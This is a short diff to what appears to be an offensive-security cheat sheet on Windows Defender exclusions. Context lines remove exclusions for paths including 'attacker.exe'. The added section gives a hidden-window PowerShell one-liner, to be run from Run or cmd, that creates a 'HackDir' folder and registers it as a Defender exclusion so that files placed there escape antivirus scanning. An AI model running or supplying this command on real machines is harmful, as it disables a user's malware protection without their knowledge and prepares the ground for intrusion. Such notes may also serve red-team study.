@@ -21,6 +21,11 @@ Remove-MpPreference -ExclusionPath "$Env:AppData\Roaming" # path
 Remove-MpPreference -ExclusionPath "$env:USERPROFILE\Documents\attacker.exe" # executable
 ```
 
+### Use from Run/cmd
+```cmd
+powershell -WindowStyle Hidden -command "New-Item -Path $env:USERPROFILE\HackDir -ItemType Directory; Add-MpPreference -ExclusionPath "$env:USERPROFILE\HackDir""
+```
+
 ### Add path/executable file via Regedit
 ```ps1
 # Path in regedit
